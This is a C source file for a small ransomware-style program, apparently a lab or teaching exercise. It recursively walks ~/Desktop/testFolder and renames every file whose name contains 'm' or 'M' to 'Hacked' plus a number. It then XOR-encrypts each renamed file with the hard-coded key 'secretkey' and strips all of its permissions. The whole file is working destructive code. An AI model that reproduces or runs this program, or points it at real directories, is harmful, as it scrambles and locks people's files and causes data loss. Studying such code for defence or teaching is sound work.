#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>


#define PATH_MAX        4096

void xorEncryptFile(const char *filePath, unsigned char *key, int key_len) {
    FILE *file = fopen(filePath, "rb+");
    if (!file) {
        perror("Could not open file");
        return;
    }

    // Read file contents
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *buffer = malloc(fileSize);
    fread(buffer, 1, fileSize, file);

    // XOR encryption
    for (long i = 0; i < fileSize; i++) {
        buffer[i] ^= key[i % key_len];
    }

    // Write encrypted content back to the file
    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, fileSize, file);
    fclose(file);

    free(buffer);

    printf("File encrypted with XOR successfully.\n");
}

void makeFileInaccessible(const char *filePath) {
    if (chmod(filePath, 0000) == -1) { // 0000 removes all permissions
        perror("Error making the file inaccessible");
    } else {
        printf("File permissions changed to make it inaccessible: %s\n", filePath);
    }
}

int isDir(const char* path) { //Determine if the filepath 'path' is a directory; return 1 if it is a directory, 0 otherwise
    struct stat buf;
    stat(path, &buf);
    return S_ISDIR(buf.st_mode);
}

void spiderDirectory(char *homeDir, DIR *d) {//Search (spider) through all of the files on the Desktop and any subdirectories
    struct dirent *dir;
    DIR *currentD;
    char currentDir[PATH_MAX];
    char newFilePath[PATH_MAX];
    static int count=0;

    while ((dir = readdir(d)) != NULL) {
        snprintf(currentDir, sizeof(currentDir), "%s/%s", homeDir, dir->d_name);

        // If the current element is a subdirectory (and not . or ..), recurse into it
        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && isDir(currentDir)) {
            currentD = opendir(currentDir);
            if (currentD) {
                spiderDirectory(currentDir, currentD);
                closedir(currentD);
            }
        }

        // Rename files containing 'M' or 'm' in the filename to "Hacked"
        if (strchr(dir->d_name, 'M') != NULL || strchr(dir->d_name, 'm') != NULL) {
            // Construct the new file path with "Hacked" as the filename
            snprintf(newFilePath, sizeof(newFilePath), "%s/Hacked%d", homeDir, count++);

            // Rename the file
            printf("Renaming file from %s to %s\n", currentDir, newFilePath);
            if (rename(currentDir, newFilePath) == 0) {
                printf("File renamed to 'Hacked' successfully.\n");
                
                // Encrypt the renamed file with XOR
                unsigned char xor_key[] = "secretkey";
                xorEncryptFile(newFilePath, xor_key, sizeof(xor_key));
                
                // Make the file inaccessible by removing all permissions
                makeFileInaccessible(newFilePath);
            } else {
                perror("Error renaming file");
            }
        }
    }
}
int main(int argc, char*argv[]) {
    DIR *d;
    char homedir[PATH_MAX];

    // Build the path to the folder on Desktop
    snprintf(homedir, sizeof(homedir), "%s/Desktop/testFolder", getenv("HOME"));

    // Open the directory and call spiderDirectory
    d = opendir(homedir);
    if (d) {
	printf("Starting directory spidering at %s\n", homedir);
        spiderDirectory(homedir, d);
        closedir(d);
    } else {
        perror("Failed to open directory");
    }

    return 0;
}
